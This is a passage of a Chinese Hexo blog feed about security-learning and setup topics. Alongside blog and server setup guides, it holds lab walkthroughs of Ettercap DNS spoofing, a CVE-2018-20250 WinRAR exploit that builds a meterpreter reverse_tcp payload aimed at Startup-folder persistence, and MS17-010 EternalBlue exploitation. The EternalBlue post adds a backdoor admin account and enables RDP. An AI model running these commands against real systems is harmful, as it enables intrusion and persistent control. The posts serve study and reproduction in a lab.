Shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 三. 使用Ngrok将服务映射到外网1. 建立隧道在Ngrok建立隧道，注意本地端口填写启动Shellinabox的端口 2.开启映射开启映射之前需要先下载客户端 1root@kali:~/linux_amd64# wget https://www.ngrok.cc/sunny/linux_amd64.zip 将下载完成后，解压并开启 123root@kali:~# unzip linux_amd64.ziproot@kali:~# cd /Desktop/linux_amd64root@kali:~# ./sunny clientid 隧道id 3. 通过外网登陆直接输入URL即可登录]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
        <tag>环境搭建</tag>
        <tag>Shellinabox</tag>
        <tag>Ngrok</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Ettercap实现DNS欺骗的简单测试]]></title>
    <url>%2Fettercap-DNS%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[前言 攻击过程 其他 一. 前言1. 什么是中间人攻击中间人攻击（Man-in-the-middle attack，缩写：MITM）是指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。 一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。 2. DNS欺骗DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。虽然这篇文章可以提供一些新的见解，但重要的是DNS欺骗是一个一般概念，有无数种方法可以实现一个DNS欺骗攻击。在一个DNS欺骗攻击中，攻击者可以利用一个漏洞来伪造网络流量。因此，要理解DNS欺骗攻击，必须理解DNS是怎样工作的。 DNS(域名系统)在互联网中是一个非常重要的协议。它属于TCP/IP，是一个分层结构的分布式模块，它包含域名的相关信息。它负责在网络上映射域名到他们各自的IP上。DNS定位主机/服务器通过查看友好域名，使用域名系统，DNS将域名和IP地址相互映射 。这些设备（路由器、服务器等）连接到你的电脑不能理解一些友好的名称 （infosecinstitute.com）,他们只了解一个IP地址，而DNS负责翻译它。 让我们来看看下面这个图来理解主机和本地DNS服务器的正常通信。 DNS服务器包含着一个主数据库，其中包括信息的IP地址，因为这涉及到相应的域名。所以在这些正常的通信中，一个主机发送请求到服务器，之后服务器响应正确的信息。如果DNS没有信息传入的请求，它将发送请求到外部DNS服务器来获取正确的响应。那么攻击者如何使用中间人攻击来实施DNS欺骗呢？下图说明了答案： 使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问google.com，并且谷歌的IP地址为173.194.35.37，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 3. Ettercap介绍Ettercap是一个综合套件，适合中间人攻击。它具有实时连接嗅探、动态内容过滤等功能，支持对许多协议的主动和被动解析，并包含许多用于网络和主机分析的功能。 二. 攻击过程1. 攻击环境 攻击机：kali linux 2019.1 IP：192.168.28.136 靶机：Windows7 ultimate sp1 IP：192.168.28.138 2. 攻击步骤2.1 开启本地web服务器在kali Linux系统中开启Apache服务 12root@kali:~# service apache2 start #开启apache服务root@kali:~# service apache2 status #查看apache状态 在web服务器中添加页面 123root@kali:~# cd /var/www/html/root@kali:/var/www/html# mv index.html index.html.bak root@kali:/var/www/html# vi index.html 在文件中输入如下内容 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;This is a test page&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; 这是一个测试页面 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.2 修改etter.dns1root@kali:~# vi /etc/ettercap/etter.dns 在文件中添加 12www.*.com A 192.168.28.136www.*.com PTR 192.168.28.136 2.3 设置Etterap使用命令ettercap -G来进入ettercap的图形界面。 选择网卡Unfied sniffing 网卡选择eth0（根据自己的计算机网卡而定） 2.4 扫描主机扫描网关下的所以在线的计算机主机，来到hosts选项下的scan for hosts 点击Hosts list列出扫到的主机 2.5 选择攻击目标在列表里选择网关进行添加，我这里的网关是192.168.28.2。选中之后点击Add to target 1 选中IP为192.168.28.138的靶机，点击Add to target 2 2.6 进行攻击配置好后在继续点击mitm&gt;arp poisoning 勾选Sniff remote connections 选择插件plugins&gt;mangge the plugins 我们要进行的是DNS欺骗，双击dns_spoof可以看见下边的提示 最后点击strat&gt;start sniffing开始DNS欺骗 2.7 查看攻击效果在靶机上使用浏览器，输入http://www.baidu.com，会显示到我们设置的页面 三. 其他以上就是使用Ettercap实现DNS欺骗的简单测试 DNS欺骗是一种非常危险的攻击，因为攻击者可以利用ettercap的dns_spoof插件和其他工具执行攻击。最终，攻击者可以使用一个社会工程工具包来执行攻击去控制受害者的电脑。想象一下这是多少容易，通过社会工程工具包和DNS欺骗技术你所需要做得就是配置你的社会工程工具包和你的IP清单，制作像谷歌一样的网站欺骗域名到你的IP地址上。当受害者打开google，你的攻击将使它访问你的IP，之后建立一个远程的会话。 参考：https://www.freebuf.com/articles/system/5265.html]]></content>
      <categories>
        <category>攻击测试</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
        <tag>攻击测试</tag>
        <tag>Ettercap</tag>
        <tag>中间人攻击</tag>
        <tag>DNS欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA渗透测试平台搭建]]></title>
    <url>%2Finstall-DVWA%2F</url>
    <content type="text"><![CDATA[关于DVWA 在Windows系统中搭建DVWA 在Linux系统中搭建DVWA 其他 一. 关于DVWADVWA(Damn Vulnerable Web Application)是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 DVWA的目标是通过简单直接的界面练习一些最常见的Web漏洞，具有各种难度。请注意，此软件存在记录和未记录的漏洞。 DVWA共有十个模块，分别是: Brute Force（暴力（破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA （不安全的验证码） SQL Injection（SQL注入） SQL Injection（Blind）（SQL盲注） XSS（Reflected）（反射型跨站脚本） XSS（Stored）（存储型跨站脚本） 同时每个模块的代码都有4种安全等级：Low、Medium、High、Impossible。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理。 二. 在Windows系统中搭建DVWA1.下载DVWA从https://github.com/ethicalhack3r/DVWA下载zip包或使用git命令直接下载 2. 将DVWA放入本地站点目录中本人的Windows系统中使用phpstudy搭建web服务器 将解压出来的文件放入phpStudy\PHPTutorial\WWW目录下 3. 安装DVWA3.1 修改配置文件打开\DVWA-master\config目录下的config.inc.php文件 修改以下字段 12345$_DVWA = array();$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'root用户密码'; 3.2 安装DVWA打开浏览器，输入http://127.0.0.1/DVWA-master/index.php进入，选择左侧的Setup/Reset DB选项，在最下方点击Create/Reset Database，如果提示Setup successful!即安装成功 3.3 登录DVWA使用浏览器访问http://127.0.0.1/DVWA-master/，输入用户名admin，密码password即可登录 三. 在Linux系统中搭建DVWA在Linux系统中搭建DVWA的过程和Windows系统中基本一致 1.下载DVWA12root@ubuntu:~# cd /var/www/htmlroot@ubuntu:/var/www/html# git clone https://github.com/ethicalhack3r/DVWA 2.修改配置文件123root@ubuntu:/var/www/html# cd DVWA/config/root@ubuntu:/var/www/html/DVWA/config# mv config.inc.php.dist config.inc.phproot@ubuntu:/var/www/html/DVWA/config# vi config.inc.php 修改config.inc.php文件的内容，同Windows系统 3. 安装DVWA在浏览器内输入127.0.0.1/DVWA，进入DVWA安装页面，拉到最下面，点击Create/Reset Database，如果提示Setup successful!即完成安装 此时会跳转到登录页面，输入账号密码即可登录 四. 其他以上便是DVWA在两种操作系统上部署的全过程，仅供参考和学习]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04安装lamp环境]]></title>
    <url>%2Fubuntu16-04-lamp%2F</url>
    <content type="text"><![CDATA[什么是lamp环境 Ubuntu16.04安装lamp环境 其他 一. 什么是lamp环境LAMP是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写： Linux，操作系统 Apache，网页服务器 MariaDB或MySQL，数据库管理系统（或者数据库服务器） PHP、Perl或Python，脚本语言 二. Ubuntu16.04安装lamp环境1. 添加软件源1.1 查找国内镜像源本文使用清华大学开源软件镜像站所提供的Ubuntu镜像源 12345678910111213# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse 1.2 配置source listsources.list系统自带的，源是来Ubuntu的官网！安装包比较慢，所以最好切换成国内的 123root@ubuntu:~$ cd /etc/aptroot@ubuntu:/etc/apt$ sudo cp sources.list sources.list.bakroot@ubuntu:/etc/apt$ vim sources.list 将国内镜像源的内容复制进去 1.4 更新源1root@ubuntu:/etc/apt$ sudo apt-get update 1.5 其他命令12345678910111213141516sudo apt-get update 更新源sudo apt-get install package 安装包sudo apt-get remove package 删除包sudo apt-cache search package 搜索软件包sudo apt-cache show package 获取包的相关信息，如说明、大小、版本等sudo apt-get install package --reinstall 重新安装包sudo apt-get -f install 修复安装sudo apt-get remove package --purge 删除包，包括配置文件等sudo apt-get build-dep package 安装相关的编译环境sudo apt-get upgrade 更新已安装的包sudo apt-get dist-upgrade 升级系统sudo apt-cache depends package 了解使用该包依赖那些包sudo apt-cache rdepends package 查看该包被哪些包依赖sudo apt-get source package 下载该包的源代码sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包sudo apt-get check 检查是否有损坏的依赖 2. 安装Apache2 web 服务器1sudo apt install apache2 -y 检查是否开启Apache 1systemctl status apache2 开启、关闭和重启服务器 123/etc/init.d/apache2 start/etc/init.d/apache2 stop/etc/init.d/apache2 restart 访问你的 web 服务器，打开浏览器并输入服务器的IP地址或者主机名 3. 安装MySQL数据库1sudo apt install mysql-server mysql-client 在安装过程中会要求设置root用户密码 确认安装成功 1sudo netstat -ano | grep 3306 4. 安装PHP脚本语音1sudo apt install php7.0-mysql php7.0-curl php7.0-json php7.0-cgi php7.0 libapache2-mod-php7.0 查看PHP版本 1php --version 查看phpinfo 1vi /var/www/html/phpinfo.php 在phpinfo.php文件内写入如下内容 123&lt;?php echo phpinfo();?&gt; 从浏览器中访问这个页面, 输入http://127.0.0.1/phpinfo.php，可以看到如下页面。 5. 安装phpmyadmin123sudo apt install php-mbstring php7.0-mbstring php-gettextsudo systemctl restart apache2.servicesudo apt install phpmyadmin 安装完成后，在浏览器中访问http://127.0.0.1/phpmyadmin，即可进入phpmyadmin 如果在浏览器中无法打开phpmyadmin，需要将/usr/share/phpmyadmin/链接到/var/www/html/目录下 1ln -s /usr/share/phpmyadmin/ /var/www/html/ 三. 其他以上便是Ubuntu16.04安装lamp环境的全过程，本地的网络服务器已经搭建成功]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>ubuntu</tag>
        <tag>lamp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用gittalk实现hexo博客评论功能]]></title>
    <url>%2Fgitalk%2F</url>
    <content type="text"><![CDATA[关于gitalk 使用gitalk实现hexo博客评论功能 其他 关于gitalkGitalk 是一个基于 GitHub Issue 和 Preact 开发的评论插件。 特性 使用GitHub登录 支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru] 支持个人或组织 无干扰模式（设置 distractionFreeMode 为 true 开启） 快捷键提交评论 （cmd|ctrl + enter） gitalk实现hexo博客评论功能Register Application在GitHub上注册新应用，链接：https://github.com/settings/applications/new 参数说明： Application name： # 应用名称，随意 Homepage URL： # 网站URL Application description # 描述，随意 Authorization callback URL：# 网站URL 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 新建gitalk.swig在主题文件夹下新建/layout/_third-party/comments/gitalk.swig文件，并添加内容： 1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt; &lt;script src=&quot;https://unpkg.com/gitalk/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var gitalk = new Gitalk(&#123; clientID: &apos;&#123;&#123; theme.gitalk.ClientID &#125;&#125;&apos;, clientSecret: &apos;&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;&apos;, repo: &apos;&#123;&#123; theme.gitalk.repo &#125;&#125;&apos;, owner: &apos;&#123;&#123; theme.gitalk.githubID &#125;&#125;&apos;, admin: [&apos;&#123;&#123; theme.gitalk.adminUser &#125;&#125;&apos;], id: location.pathname, distractionFreeMode: &apos;&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;&apos; &#125;) gitalk.render(&apos;gitalk-container&apos;) &lt;/script&gt;&#123;% endif %&#125; 修改comments.swig修改主题文件夹内/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt; 修改index.swig修改layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include &apos;gitalk.swig&apos; %&#125; 新建gitalk.styl新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 修改third-party.styl修改/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import &quot;gitalk&quot;; 修改_config.yml在主题配置文件next/_config.yml中添加如下内容： 12345678gitalk: enable: true githubID: github帐号 repo: 仓库名称 ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 其他以上就是NexT中添加gitalk评论的配置，博客上传到GitHub上后，打开页面进入某一博客内容下，就可看到评论处。 参考文章 https://asdfv1929.github.io/2018/01/20/gitalk/ https://liujunzhou.top/2018/8/10/gitalk-error/]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-20250（WinRAR目录穿越漏洞）复现]]></title>
    <url>%2Fwinrar-CVE-2018-20250%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2月下旬，著名压缩软件WinRAR被曝高危漏洞，全球已有超过5亿用户受到影响。该漏洞一旦被黑客利用，黑客就能将恶意程序植入使用者电脑的开机程序中，该漏洞在2005年便已经存在。 本文在虚拟环境中，使用Metasploit对漏洞攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。该动态链接库的作用是处理 ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。 2.漏洞影响 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Metasploit5生成免杀Payload在kali Linux中输入msfconsole命令启动Metasploit 在Metasploit中依次输入 1234use evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcp 输入show options查看配置 使用如下命令修改配置 12set lhost 192.168.28.136set lport 12345 修改完成后输入run运行，提示生成如下文件 2.使用exp生成恶意文件exp下载：https://github.com/WyAtu/CVE-2018-20250/ 2.1修改exp.py文件将exp.py中的evil_filename“的值改为&quot;WinRAR.exe&quot;，将target_filename的值改为&quot;.\hi.exe&quot; 2.2生成恶意文件将刚才使用Metasploit生成的WinRAR.exe文件复制到下载的exp文件夹内，使用python exp.py命令生成恶意程序test.rar 值得注意的是，执行此命令需要python3以上的环境，另外如果在Linux系统中执行不成功可以尝试使用Windows系统来执行 3.在kali Linux中使用Metasploit监听靶机在Linux终端中运行如下命令 1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.28.128set lport 12345run 4.在靶机上运行恶意程序将test.rar文件放入靶机，解压该文件，解压后会生成如下文件 双击执行hi.exe文件，此时kali Linux中会收到会话，即可获得靶机权限 四.后记以上便是使用CVE-2018-20250漏洞对靶机进行攻击的整个复现过程，我们看到病毒可以通过恶意压缩包进行传播，在本次复现中，我们将病毒文件直接解压在压缩文件解压的目标文件夹中并手动运行的，其实我们是可以通过修改exp.py文件中target_filename的值来修改病毒文件解压出来的位置，例如对win7系统的靶机，我们可以将值修改为r&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;，这样病毒文件就会在下次开机是自动启动，悄无声息的完成对电脑的攻击。 大家可以留意一下自己电脑中压缩软件的版本，选择最新版本的软件即可防止此类攻击，同时也要养成好的习惯，不随意下载和使用不明来源的压缩文件]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>漏洞复现</tag>
        <tag>CVE-2018-20250</tag>
        <tag>WinRAR目录穿越漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms17-010（永恒之蓝）漏洞复现]]></title>
    <url>%2Fms17-010%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 2.漏洞影响目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Nmap对靶机进行扫描1.1.在本地查找ms17-010漏洞 1.2.使用nmap对靶机进行扫描使用命令并执行 1root@kali:/usr/share/nmap/scripts# nmap --script smb-vuln-ms17-010 192.168.28.128 2.使用Metasploit对目标进行监听输入msfconsole启动Metasploit在Metasploit中，输入search ms17-010查找永恒之蓝漏洞 输入use exploit/windows/smb/ms17_010_eternalblue执行漏洞输入show options查看当前攻击配置 将配置中第一行的RHOST修改为靶机IP地址1set rhost 192.168.28.128 再次查看配置 配置完成后，使用run命令执行程序，如果执行成功，会进入windows系统的命令行 在命令行中输入whoami查看当前登录用户 3.在靶机创建用户并赋予管理员权限12net user username password /addnet localgroup administrators username /add 4.开启3389端口并使用远程桌面登录在命令行中输入REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f并执行，即可打开3389端口此时我们新建一个终端，输入rdesktop 192.168.28.128登录远程桌面 此时我们选择其他用户并使用刚才创建的用户登录，稍等便能登录到Windows桌面了 四.后记以上便是使用ms17-010永恒之蓝漏洞对靶机进行攻击的整个复现过程，由此可见攻击过程并不复杂，只需要简单的步骤即可完成攻击并获得极高的权限。由此我们也可以看到平常在使用计算机的时候要注重安全防护。 此漏洞应该在系统的自动更新或各电脑管家的更新中会提示修复的，大家可以查看一下自己的系统有没有安装，没有的话一定要安装]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
        <tag>Metasploit</tag>
        <tag>ms17-010</tag>
        <tag>永恒之蓝</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在hexo中添加主题和live2d看板娘]]></title>
    <url>%2Fnext_live2d%2F</url>
    <content type="text"><![CDATA[使用hexo主题 在博客中添加live2d看板娘 一.使用hexo主题hexo拥有大量的主题文件，我们可以通过官方的主题页面来查找自己想要的主题，同时官方还有创建主题的文档可以参考。 选择你想要使用的主题，本文用next主题来演示。 1.下载主题进入hexo站点目录下，使用git输入1$ git clone https://github.com/iissnan/hexo-theme-next themes/next 2.启用主题在下完完成后，打开站点配置文件_config.yml，找到theme字段，并将值改为你所使用的主题名。 随后使用hexo clean清除hexo缓存。 3.验证主题启动hexo本地站点 1hexo s -d 访问本地站点，看到主题改变了，就表示安装成功了。 4.自定义主题主题安装完成后，进入theme文件夹下的主题文件夹内，修改_config.yml配置文件，配置文件的具体内容可以参考主题的相关文档。 二.添加live2d看板娘1.安装打开hexo目录，使用git bash输入 1npm install --save hexo-helper-live2d 2.开启进入网站配置文件内，添加如下内容 12345678910111213141516live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false log: false model: use: live2d-widget-model-z16 display: position: right width: 150 height: 300 mobile: show: false 保存后重新生成网站即可看到。 3.添加模型打开hexo目录，使用git bash输入 1npm install 模型的包名 然后将包名输入位于 _config.yml 的 model.use 中。 三.参考资料next主题 live2d]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>美化</tag>
        <tag>live2d</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用GitHub+hexo搭建个人博客]]></title>
    <url>%2Fmy-first-blog%2F</url>
    <content type="text"><![CDATA[随笔 博客搭建过程 其他的一些东西 一.随笔从3月开始学习网络安全相关的知识，但愿有朝一日能够步入网络安全的门，进入这个行业 学习第二周，第一次搭建博客，第一次写markdown，希望能够坚持下去，记录一些学到的东西 二.使用GitHub搭建个人博客1.准备工作 需要的软件 node.js(http://nodejs.cn/) git(https://git-scm.com/) hexo(https://hexo.io/zh-cn/) 2.创建仓库新建一个名为你的用户名.github.io的仓库，生成后的访问地址是 https://你的用户名.github.io ,貌似必须是自己的用户名，否则无法访问，不过我自己并没有试过。 如果自己有域名的话可以绑定自己的域名，不过不绑定也没有什么关系。 3.配置SSH key使用ssh key来进行本地和服务器间的链接 1$ cd ~/. ssh #检查是否存在ssh密钥 如果提示：No such file or directory 说明你是第一次使用git。 1$ ssh-keygen -t rsa -C "邮箱地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key： 保存之后测试一下是否成功 1$ ssh -T git@github.com #这里的邮箱地址不用修改 如果看到提示Are you sure you want to continue connecting (yes/no)? ，输入yes，然后就会看到 Hi CJJKKK! You’ve successfully authenticated, but GitHub does not provide shell access. 说明配置已经成功了，接下来继续配置用户名和邮箱 12$ git config --global user.name "用户名" #你的用户名$ git config --global user.email "邮箱" #你的注册邮箱 4.安装hexo4.1关于hexoHexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。 4.2安装 (1)尽量使用git bash来完成 (2)hexo不同版本有较大差别，看教程的时候要注意 (3)hexo有两种配置文件_config.yml文件，一个是根目录下的，一个是各个theme下的 安装hexo 1$ npm install -g hexo 5.初始化在电脑上新建一个文件夹专门用来存放代码，然后使用git bash进入该文件夹 1$ hexo init hexo会自动下载一些文件到这个目录 12$ hexo g #生成$ hexo s #启动 执行这些命令后，hexo就会在public文件夹生成相关html文件，这些文件将来都是要提交到github去的 hexo s是开启本地预览服务，打开浏览器访问 http://localhost:4000 即可看到内容，如果打不开可能是端口被占用了，可以换个端口解决。记得本地预览完之后用ctrl+c关闭本地预览服务 hexo是支持修改主题的，具体如何修改可能下一篇文章会讲hhh 6.上传到GitHub完成了上面的操作后，就要上传到GitHub了 在配置完ssh key之后，要配置_config.yml中的有关deploy部分 1234deploy: type: git repository: git@github.com:用户名/用户名.github.io.git branch: master 接下来输入hexo d -g就会提交代码了 如果显示error deployer not found:github，可以使用如下命令来完成 1$ npm install --save hexo-deployer-git 还有一些关于保留CNAME、README.md等文件的东西，一些非md文件可以把他们放到source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的。由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。 7.常用hexo命令1234567$ hexo new "postName" #新建文章$ hexo new page "pageName" #新建页面$ hexo generate #生成静态页面至public目录$ hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）$ hexo deploy #部署到GitHub$ hexo help # 查看帮助$ hexo version #查看Hexo的版本 组合命令 12$ hexo s -g #生成并本地预览$ hexo d -g #生成并上传 8.如何写博客定位到代码目录里，执行命令 1$ hexo new 'my-first-blog' hexo会在_post下生成相关的md文件，这时候只要打开就可以写博客了 一般完整格式如下： 123456789---title: postName #文章页面上的显示名称，一般是中文date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面---以下是正文 关于写博客的工具，我用的是Typora，或者有其他的写markdown的工具也可以，反正我是刚开始用，用的也不好。 让博客不显示全文的方法 在合适的位置上加入&lt;!--more--&gt;即可。 三.还有些其他的到此位置使用GitHub搭建博客应该就完成了，这个时候可以去查看一下自己的博客是什么样子的了。 我本人实在是不大会写markdown，就先写这么多，可能最后有一些问题，比如目录显示不出来之类的，学会了继续改。 最后是一些参考资料。 参考博客 markdown教程 Hexo文档]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>随笔</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
</search>
